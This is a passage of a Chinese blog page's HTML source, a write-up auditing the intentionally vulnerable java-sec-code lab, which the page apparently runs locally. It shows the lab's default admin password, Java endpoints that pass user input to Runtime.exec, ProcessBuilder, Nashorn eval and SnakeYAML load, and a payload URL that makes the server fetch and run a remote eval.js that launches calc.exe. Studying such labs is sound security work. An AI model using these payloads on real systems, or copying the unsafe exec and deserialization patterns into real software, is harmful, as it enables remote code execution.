    // 用于处理 lazyload 引起的 cls 导致的定位失败问题
    // option.observer = false
    if (option.observer) {
      setTimeout(() => {
        if (volantis.scroll.ele != ele) {
          return
        }
        volantis.scroll.unengine.push(() => {
          let me = ele.getBoundingClientRect().top
          if(!(me >= -option.observerDic && me <= option.observerDic)){
            volantis.scroll.to(ele, option)
          }
          volantis.scroll.unengine.remove("unengineObserver")
        },"unengineObserver")
      },1000)
    }
  }
  /********************** Content Visibility ********************************/
  // 见 source/css/first.styl 如果遇到任何问题 删除 .post-story 即可
  // 一个元素被声明 content-visibility 属性后 如果元素不在 viewport 中 浏览器不会计算其后代元素样式和属性 从而节省 Style & Layout 耗时
  // content-visibility 的副作用: 锚点失效 等等(实验初期 暂不明确), 使用此方法清除样式
  volantis.cleanContentVisibility = ()=>{
    if (document.querySelector(".post-story")) {
      console.log("cleanContentVisibility");
      document.querySelectorAll(".post-story").forEach(e=>{
        e.classList.remove("post-story")
      })
    }
  }
  /******************************************************************************/
  /******************************************************************************/
  /******************************************************************************/
  //图像加载出错时的处理
  function errorImgAvatar(img) {
    img.src = "https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/avatar/round/3442075.svg";
    img.onerror = null;
  }
  function errorImgCover(img) {
    img.src = "https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/cover/76b86c0226ffd.svg";
    img.onerror = null;
  }
  /******************************************************************************/
</script>

  <!-- import head_end begin -->
  <!-- import head_end end -->
  <!-- Custom Files headEnd begin-->
  
  <!-- Custom Files headEnd end-->
  <!-- front-matter head_end begin -->
  <!-- front-matter head_end end -->
</head>
  <body itemscope itemtype="http://schema.org/WebPage">
    <!-- import body_begin begin-->
    <!-- import body_begin end-->
    <!-- Custom Files bodyBegin begin-->
    
    <!-- Custom Files bodyBegin end-->
    <!-- front-matter body_begin begin -->
    <!-- front-matter body_begin end -->
    <header itemscope itemtype="http://schema.org/WPHeader" id="l_header" class="l_header auto shadow floatable blur show" style='opacity: 0' >
  <div class='container'>
  <div id='wrapper'>
    <div class='nav-sub'>
      <p class="title"></p>
      <ul class='switcher nav-list-h m-phone' id="pjax-header-nav-list">
        <li><a id="s-comment" class="fa-solid fa-comments fa-fw" target="_self"  href="/" onclick="return false;" title="comment"></a></li>
        
          <li><a id="s-toc" class="s-toc fa-solid fa-list fa-fw" target="_self"  href="/" onclick="return false;" title="toc"></a></li>
        
      </ul>
    </div>
		<div class="nav-main">
      
        
        <a class="title flat-box" target="_self" href='/'>
          
            <img no-lazy class='logo' src='https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/Logo-NavBar@3x.png'/>
          
          
          
        </a>
      

			<div class='menu navigation'>
				<ul class='nav-list-h m-pc'>
          
          
          
            
            
              <li>
                <a class="menuitem flat-box faa-parent animated-hover"
                href="/" title="博客"
                  
                  
                  
                    active-action="action-home"
                  >
                  <i class='fa-solid fa-rss fa-fw'></i>博客
                </a>
                
              </li>
            
          
          
            
            
              <li>
                <a class="menuitem flat-box faa-parent animated-hover"
                href="/categories/" title="分类"
                  
                  
                  
                    active-action="action-categories"
                  >
                  <i class='fa-solid fa-folder-open fa-fw'></i>分类
                </a>
                
              </li>
            
          
          
            
            
              <li>
                <a class="menuitem flat-box faa-parent animated-hover"
                href="/tags/" title="标签"
                  
                  
                  
                    active-action="action-tags"
                  >
                  <i class='fa-solid fa-tags fa-fw'></i>标签
                </a>
                
              </li>
            
          
          
            
            
              <li>
                <a class="menuitem flat-box faa-parent animated-hover"
                href="/archives/" title="归档"
                  
                  
                  
                    active-action="action-archives"
                  >
                  <i class='fa-solid fa-archive fa-fw'></i>归档
                </a>
                
              </li>
            
          
          
            
            
              <li>
                <a class="menuitem flat-box faa-parent animated-hover"
                href="/friends/" title="友链"
                  
                  
                  
                    active-action="action-friends"
                  >
                  <i class='fa-solid fa-link fa-fw'></i>友链
                </a>
                
              </li>
            
          
          
            
            
              <li>
                <a class="menuitem flat-box faa-parent animated-hover"
                href="/about/" title="关于"
                  
                  
                  
                    active-action="action-about"
                  >
                  <i class='fa-solid fa-info-circle fa-fw'></i>关于
                </a>
                
              </li>
            
          
          
				</ul>
			</div>
      
      <div class="m_search">
        <form name="searchform" class="form u-search-form">
          <i class="icon fa-solid fa-search fa-fw"></i>
          <input type="text" class="input u-search-input" placeholder="Search..." />
        </form>
      </div>
      

			<ul class='switcher nav-list-h m-phone'>
				
					<li><a class="s-search fa-solid fa-search fa-fw" target="_self" href="/" onclick="return false;" title="search"></a></li>
				
				<li>
          <a class="s-menu fa-solid fa-bars fa-fw" target="_self" href="/" onclick="return false;" title="menu"></a>
          <ul class="menu-phone list-v navigation white-box">
            
              
            
              <li>
                <a class="menuitem flat-box faa-parent animated-hover"
                href="/" title="博客"
                  
                  
                  
                    active-action="action-home"
                  >
                  <i class='fa-solid fa-rss fa-fw'></i>博客
                </a>
                
              </li>
            
          
            
              
            
              <li>
                <a class="menuitem flat-box faa-parent animated-hover"
                href="/categories/" title="分类"
                  
                  
                  
                    active-action="action-categories"
                  >
                  <i class='fa-solid fa-folder-open fa-fw'></i>分类
                </a>
                
              </li>
            
          
            
              
            
              <li>
                <a class="menuitem flat-box faa-parent animated-hover"
                href="/tags/" title="标签"
                  
                  
                  
                    active-action="action-tags"
                  >
                  <i class='fa-solid fa-tags fa-fw'></i>标签
                </a>
                
              </li>
            
          
            
              
            
              <li>
                <a class="menuitem flat-box faa-parent animated-hover"
                href="/archives/" title="归档"
                  
                  
                  
                    active-action="action-archives"
                  >
                  <i class='fa-solid fa-archive fa-fw'></i>归档
                </a>
                
              </li>
            
          
            
              
            
              <li>
                <a class="menuitem flat-box faa-parent animated-hover"
                href="/friends/" title="友链"
                  
                  
                  
                    active-action="action-friends"
                  >
                  <i class='fa-solid fa-link fa-fw'></i>友链
                </a>
                
              </li>
            
          
            
              
            
              <li>
                <a class="menuitem flat-box faa-parent animated-hover"
                href="/about/" title="关于"
                  
                  
                  
                    active-action="action-about"
                  >
                  <i class='fa-solid fa-info-circle fa-fw'></i>关于
                </a>
                
              </li>
            
          
            
          </ul>
        </li>
			</ul>

      <!-- Custom Files header begin -->
      
      <!-- Custom Files header end -->
		</div>
	</div>
  </div>
</header>

    <div id="l_body">
      <div id="l_cover">
  
    
      <!-- see: /layout/_partial/scripts/_ctrl/coverCtrl.ejs -->
      <div id="none" class='cover-wrapper post dock' style="display: none;">
        
  <div class='cover-bg lazyload placeholder' data-bg="https://gcore.jsdelivr.net/gh/MHG-LAB/cron@gh-pages/bing/bing.jpg"></div>

<div class='cover-body'>
  <div class='top'>
    
    
      <p class="title">Volantis</p>
    
    
  </div>
  <div class='bottom'>
    <div class='menu navigation'>
      <div class='list-h'>
        
          
            <a href="/v4/getting-started/"
              
              
              active-action="action-v4getting-started">
              <img src='https://unpkg.com/volantis-static@0.0.1654736714924/media/twemoji/assets/svg/1f5c3.svg'><p>文档</p>
            </a>
          
            <a href="/faqs/"
              
              
              active-action="action-faqs">
              <img src='https://unpkg.com/volantis-static@0.0.1654736714924/media/twemoji/assets/svg/1f516.svg'><p>帮助</p>
            </a>
          
            <a href="/examples/"
              
              
              active-action="action-examples">
              <img src='https://unpkg.com/volantis-static@0.0.1654736714924/media/twemoji/assets/svg/1f396.svg'><p>示例</p>
            </a>
          
            <a href="/contributors/"
              
              
              active-action="action-contributors">
              <img src='https://unpkg.com/volantis-static@0.0.1654736714924/media/twemoji/assets/svg/1f389.svg'><p>社区</p>
            </a>
          
            <a href="/archives/"
              
              
              active-action="action-archives">
              <img src='https://unpkg.com/volantis-static@0.0.1654736714924/media/twemoji/assets/svg/1f4f0.svg'><p>博客</p>
            </a>
          
            <a target="_blank" rel="noopener" href="https://github.com/volantis-x/hexo-theme-volantis/"
              
              
              active-action="action-https:githubcomvolantis-xhexo-theme-volantis">
              <img src='https://unpkg.com/volantis-static@0.0.1654736714924/media/twemoji/assets/svg/1f9ec.svg'><p>源码</p>
            </a>
          
        
      </div>
    </div>
  </div>
</div>

        <div id="scroll-down" style="display: none;"><i class="fa fa-chevron-down scroll-down-effects"></i></div>
      </div>
    
  
</div>

      <div id="safearea">
        <div class="body-wrapper">
          
<div id="l_main" class=''>
  <article itemscope itemtype="http://schema.org/Article" class="article post white-box reveal md shadow floatable blur article-type-post" id="post" itemscope itemprop="blogPost">
  <link itemprop="mainEntityOfPage" href="http://example.com/2025/07/22/java-sec-code/">
  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="Hexo">
  </span>
  <span hidden itemprop="post" itemscope itemtype="http://schema.org/Post">
    <meta itemprop="name" content="Hexo">
    <meta itemprop="description" content="">
  </span>
  


  
    <span hidden>
      <meta itemprop="image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
    </span>
  
  <div class="article-meta" id="top">
    
    
    
      <h1 class="title" itemprop="name headline">
        java_sec_code
      </h1>
      <div class='new-meta-box'>
        
          
            
<div class='new-meta-item author' itemprop="author" itemscope itemtype="http://schema.org/Person">
  <a itemprop="url" class='author' href="/" rel="nofollow">
    <img itemprop="image" src="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/apple-touch-icon.png" class="lazyload" data-srcset="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/apple-touch-icon.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
    <p itemprop="name">请设置文章作者</p>
  </a>
</div>

          
        
          
            

          
        
          
            <div class="new-meta-item date" itemprop="dateCreated datePublished" datetime="2025-07-22T19:28:08+08:00">
  <a class='notlink'>
    <i class="fa-solid fa-calendar-alt fa-fw" aria-hidden="true"></i>
    <p>发布于：Jul 22, 2025</p>
  </a>
</div>

          
        
          
            



          
        
        <!-- Custom Files topMeta begin-->
        
        <!-- Custom Files topMeta end-->
      </div>
    
  </div>


  <div id="layoutHelper-page-plugins"></div>
  <div id="post-body" itemprop="articleBody">
    <h1 id="java-sec-code"><a href="#java-sec-code" class="headerlink" title="java_sec_code"></a>java_sec_code</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>网安还是有点冷门了，这个靶场在网上没有那种特别齐全的文章，不知道有没有flag这个东西，但是看了下别人的博客好像都是看漏洞的代码然后进行审计。</p>
<p>还有那个一开始的登录框好抽象，我以为是第一道题目，没想到是直接输入密码进行登录</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin</span><br><span class="line">admin123</span><br></pre></td></tr></table></figure>

<p>登录进行后是一个简单的前端界面</p>


<p>这里面有各种漏洞主要集中在这个路径下</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java-sec-code-master\src\main\java\org\joychou\controller</span><br></pre></td></tr></table></figure>

<p>但是我看有些博客中有一些其他的路由的漏洞没有在这个index.html中，到时候再说吧</p>
<h2 id="1-RCE"><a href="#1-RCE" class="headerlink" title="1.RCE"></a>1.RCE</h2><p>命令执行是我看的第一个java漏洞，也就从这里开始吧，源码是三个路由，挨个来分析代码</p>
<h3 id="runtime-exec"><a href="#runtime-exec" class="headerlink" title="&#x2F;runtime&#x2F;exec"></a>&#x2F;runtime&#x2F;exec</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/runtime/exec&quot;)</span></span><br><span class="line"><span class="comment">//这个用于Spring框架定义路由以及一些指定条件 映射到下面这个方法</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">CommandExec</span><span class="params">(String cmd)</span> &#123;<span class="comment">//在方法中写入参数直接通过请求头识别并获取</span></span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">run</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line"><span class="comment">//实例化Runtime用于创建子进程执行命令</span></span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line"><span class="comment">//用于处理获得的字符串</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Process</span> <span class="variable">p</span> <span class="operator">=</span> run.exec(cmd);</span><br><span class="line"><span class="comment">//创建子进程执行命令</span></span><br><span class="line">            <span class="type">BufferedInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedInputStream</span>(p.getInputStream());</span><br><span class="line"><span class="comment">//BufferedIputStream是一个缓冲输入流类，为了提高读取速率</span></span><br><span class="line">            <span class="type">BufferedReader</span> <span class="variable">inBr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(in));</span><br><span class="line"><span class="comment">//在通过BufferedReader将字节流转化为字符流便于按行读取</span></span><br><span class="line">            String tmpStr;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> ((tmpStr = inBr.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                sb.append(tmpStr);</span><br><span class="line"><span class="comment">//调用StringBuilder的append进行追加 将每行字符串追加到sb中</span></span><br><span class="line"><span class="comment">// 注意：这里没有添加换行符，所有输出行会连在一起</span></span><br><span class="line">            <span class="comment">// 如果需要保留换行，可以改为 sb.append(tmpStr).append(&quot;\n&quot;);</span></span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (p.waitFor() != <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (p.exitValue() == <span class="number">1</span>)</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&quot;Command exec failed!!&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            inBr.close();</span><br><span class="line">            in.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">return</span> e.toString();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sb.toString();</span><br><span class="line"><span class="comment">//调用tuString()方法输出所有内容</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>这个代码没有什么好看的，就是直接使用exec()进行命令执行，然后输出执行结果没有什么特殊的，关键是不知道是不是权限不够的原因，无论使用<code>cmd.exe dir</code>还是<code>cmd /c dir</code>这些命令都无法执行，看来只能whoami了</p>
<h3 id="ProcessBuilder"><a href="#ProcessBuilder" class="headerlink" title="&#x2F;ProcessBuilder"></a>&#x2F;ProcessBuilder</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/ProcessBuilder&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">processBuilder</span><span class="params">(String cmd)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//String[] arrCmd = &#123;&quot;/bin/sh&quot;, &quot;-c&quot;, cmd&#125;;</span></span><br><span class="line">            <span class="comment">//上面的代码需要修改为Windows命令执行 否则会报错</span></span><br><span class="line">            String[] arrCmd = &#123;<span class="string">&quot;cmd&quot;</span>, <span class="string">&quot;/c&quot;</span>, cmd&#125;;</span><br><span class="line">            <span class="type">ProcessBuilder</span> <span class="variable">processBuilder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(arrCmd);</span><br><span class="line">            <span class="type">Process</span> <span class="variable">p</span> <span class="operator">=</span> processBuilder.start();</span><br><span class="line"><span class="comment">//创建子进程</span></span><br><span class="line">            <span class="type">BufferedInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedInputStream</span>(p.getInputStream());</span><br><span class="line">            <span class="type">BufferedReader</span> <span class="variable">inBr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(in));</span><br><span class="line">            String tmpStr;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> ((tmpStr = inBr.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                sb.append(tmpStr);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">return</span> e.toString();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> sb.toString();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>这个代码相较于上一个命令执行的路由将直接使用Runtime创建子进程进行命令执行改为了使用ProcessBuilder进行命令执行</p>
<p>ProcessBuilder这个类支持字符串命令执行和数组命令执行，数组命令执行由于将可执行文件，选项，和命令字符串使用数组进行了分隔导致可执行文件后面参数无法进行Shell解析防止了命令注入</p>
<p>原理就是将第一个参数（<code>&quot;ls&quot;</code>）作为可执行文件路径或名称（通过 <code>PATH</code> 环境变量查找）也就是我们平时ls，cat等命令都是通过环境变量中的可执行文件使用的</p>
<p>后面参数（<code>&quot;-l&quot;</code>, <code>&quot;my dir&quot;</code>）就按顺序传递给程序，由于后续参数不会触发shell解析，而且参数中的各种特殊符号也被视为普通字符，导致我们无法进行命令注入</p>
<h3 id="jscmd"><a href="#jscmd" class="headerlink" title="&#x2F;jscmd"></a>&#x2F;jscmd</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/jscmd&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">jsEngine</span><span class="params">(String jsurl)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// js nashorn javascript ecmascript</span></span><br><span class="line">        <span class="type">ScriptEngine</span> <span class="variable">engine</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ScriptEngineManager</span>().getEngineByName(<span class="string">&quot;js&quot;</span>);</span><br><span class="line"><span class="comment">//通过getEngineByName方法 返回js的引擎接口ScriptEngine</span></span><br><span class="line">        <span class="type">Bindings</span> <span class="variable">bindings</span> <span class="operator">=</span> engine.getBindings(ScriptContext.ENGINE_SCOPE);</span><br><span class="line"><span class="comment">//通过getBindings方法获取脚本引擎的绑定对象(Bindings)，它定义了Java与脚本语言之间的变量共享机制  后面那个ScriptContext.ENGINE_SCOPE则表示引擎级别的绑定范围常量（值为100）</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> String.format(<span class="string">&quot;load(\&quot;%s\&quot;)&quot;</span>, jsurl);</span><br><span class="line"><span class="comment">//通过format方法进行字符串的格式化 让jsurl这个变量放入%s的位置</span></span><br><span class="line">        engine.eval(cmd, bindings);</span><br><span class="line"><span class="comment">//先通过js引擎接口调用eval执行cmd代码， bindings构造沙箱执行的cmd脚本中的变量只会在bindings这个沙箱中存在  相应的我们可以在其他地方执行脚本的时候通过bindings执行</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>这个代码很明显用的是js执行eval进行代码执行，我们还是先来看一下不认识函数的详细介绍</p>
<p><strong>ScriptEngine</strong></p>
<p>这个是脚本引擎的核心操作接口，也就是这个接口有很多用来操作脚本的函数，比如我们代码中用到的eval，代码中的ScriptEngineManager类就是一个ScriptEngine的实现类</p>
<p><strong>ScriptEngineManager</strong></p>
<p><strong>主要功能</strong>：</p>
<ul>
<li>自动发现和注册可用的脚本引擎</li>
<li>维护引擎名称到工厂类的映射表</li>
<li>提供多种获取引擎实例的方式</li>
</ul>
<p>我们代码中主要通过getEngineByName这个方法获取到js的引擎实例，使用”js”作为引擎名称获取Nashorn引擎，Nashorn是Java实现的JavaScript引擎</p>
<p><strong>Bindings</strong></p>
<p><code>Bindings</code> 是 Java 脚本 API (<code>javax.script</code>) 中的核心接口，它作为 Java 与脚本语言之间的<strong>双向数据通道</strong>，管理变量绑定和共享。</p>
<p>也就是说可以通过这个对象进行管理变量的绑定和共享，正如代码中那样可以在执行脚本的时候加上这个参数，让脚本中的变量存放在这个对象中，等到运行其他脚本的时候可以通过则个对象再在其他脚本中加载对象，这个就是简单的沙箱</p>
<p>沙箱是一种安全隔离环境，在Java脚本引擎中主要通过<code>Bindings</code>实现。下面我将结合技术细节和实际示例全面解析这一概念。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建全新的Bindings作为沙箱容器</span></span><br><span class="line"><span class="type">Bindings</span> <span class="variable">sandbox</span> <span class="operator">=</span> engine.createBindings();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 只暴露必要的安全API</span></span><br><span class="line">sandbox.put(<span class="string">&quot;safeMath&quot;</span>, <span class="keyword">new</span> <span class="title class_">SafeMathUtil</span>());</span><br><span class="line">sandbox.put(<span class="string">&quot;logger&quot;</span>, <span class="keyword">new</span> <span class="title class_">RestrictedLogger</span>());</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在隔离环境中执行</span></span><br><span class="line">engine.eval(untrustedScript, sandbox);</span><br></pre></td></tr></table></figure>



<p>然后我们看这个代码，代码将我们输入的参数填到load()函数中再进行代码执行，在Nashorn中是用来加载外部的js文件的，也就是说我们可以利用SSRF让其去加载我们的攻击文件</p>
<p>eval.js</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="title class_">Runtime</span> = <span class="title class_">Java</span>.<span class="title function_">type</span>(<span class="string">&#x27;java.lang.Runtime&#x27;</span>);</span><br><span class="line"><span class="title class_">Runtime</span>.<span class="title function_">getRuntime</span>().<span class="title function_">exec</span>(<span class="string">&#x27;calc.exe&#x27;</span>);</span><br><span class="line"><span class="comment">//成功弹出计算器</span></span><br></pre></td></tr></table></figure>



<p>payload</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//localhost:8080/rce/jscmd?jsurl=http://127.0.0.1:1999/eval.js</span></span><br></pre></td></tr></table></figure>

<p>于是这样就加载并执行了我们的js代码，和文件包含有点像</p>






<h3 id="vuln-yarm"><a href="#vuln-yarm" class="headerlink" title="&#x2F;vuln&#x2F;yarm"></a>&#x2F;vuln&#x2F;yarm</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/vuln/yarm&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">yarm</span><span class="params">(String content)</span> &#123;</span><br><span class="line">        <span class="type">Yaml</span> <span class="variable">y</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>();</span><br><span class="line">        y.load(content);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>这个代码看起来很简单，和上一个路由一样使用了load加载文件，但是这次可不是eval执行代码，使用的是Yaml类</p>
<p><strong>Yaml类</strong></p>
<p><code>Yaml</code> 类是 Java 中用于处理 YAML 数据的核心类，主要来自 <strong>SnakeYAML</strong> 库。它是 Java 生态中最常用的 YAML 处理工具之一。</p>
<p>主要用途</p>
<ul>
<li>将 YAML 格式的字符串解析为 Java 对象（反序列化）</li>
<li>将 Java 对象转换为 YAML 格式的字符串（序列化）</li>
</ul>
<p>使用实例</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建 YAML 实例</span></span><br><span class="line"><span class="type">Yaml</span> <span class="variable">yaml</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 反序列化（YAML字符串 → Java对象）</span></span><br><span class="line"><span class="type">String</span> <span class="variable">yamlStr</span> <span class="operator">=</span> <span class="string">&quot;name: John\nage: 30&quot;</span>;</span><br><span class="line">Map&lt;String, Object&gt; data = yaml.load(yamlStr);</span><br><span class="line">System.out.println(data.get(<span class="string">&quot;name&quot;</span>)); <span class="comment">// 输出 &quot;John&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 序列化（Java对象 → YAML字符串）</span></span><br><span class="line">Map&lt;String, Object&gt; obj = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">obj.put(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;Alice&quot;</span>);</span><br><span class="line">obj.put(<span class="string">&quot;age&quot;</span>, <span class="number">25</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> yaml.dump(obj);</span><br><span class="line">System.out.println(output);</span><br><span class="line"><span class="comment">// 输出：</span></span><br><span class="line"><span class="comment">// name: Alice</span></span><br><span class="line"><span class="comment">// age: 25</span></span><br></pre></td></tr></table></figure>

<p>核心方法</p>
<table>
<thead>
<tr>
<th align="left">方法</th>
<th align="left">描述</th>
<th align="left">示例</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>load(String yaml)</code></td>
<td align="left">解析单个 YAML 文档</td>
<td align="left"><code>Object obj = yaml.load(&quot;key: value&quot;)</code></td>
</tr>
<tr>
<td align="left"><code>loadAll(String yaml)</code></td>
<td align="left">解析多个 YAML 文档</td>
<td align="left"><code>Iterable&lt;Object&gt; docs = yaml.loadAll(&quot;---\ndoc1\n---\ndoc2&quot;)</code></td>
</tr>
<tr>
<td align="left"><code>dump(Object data)</code></td>
<td align="left">序列化 Java 对象</td>
<td align="left"><code>String yaml = yaml.dump(map)</code></td>
</tr>
<tr>
<td align="left"><code>dumpAll(Iterator&lt;?&gt; data)</code></td>
<td align="left">序列化多个对象</td>
<td align="left"><code>String yaml = yaml.dumpAll(list.iterator())</code></td>
</tr>
</tbody></table>
<p>也就是说这个Yaml类是专门用来对YAML文档进行操作的，和json数据差不多，那我们代码中使用的是load方法对YAML文档进行解析。可以将YAML文档解析为对象，属于反序列化漏洞</p>
<p>传统的YAML文档使用的也是和我们之前见过的反序列化数据一样，主要包含属性类名等信息，但是YAML还可以解析YAML标签，也就是说有YAML有两种解析方法。</p>
<p>一种是将普通键值对转化为数组列表等数据结构，还有一种就是解析YAML标签转化为对象触发反序列化</p>
<p><strong>YAML标签</strong></p>
<p>YAML 的 <strong>标签（Tags）</strong> 是一种核心特性，用于标识数据的类型或语义，允许 YAML 处理器在解析时对数据进行特殊处理（如类型转换、对象构造等）</p>
<p>YAML 标签以 <code>!</code> 或 <code>!!</code> 开头，后跟一个标识符，格式如下：</p>
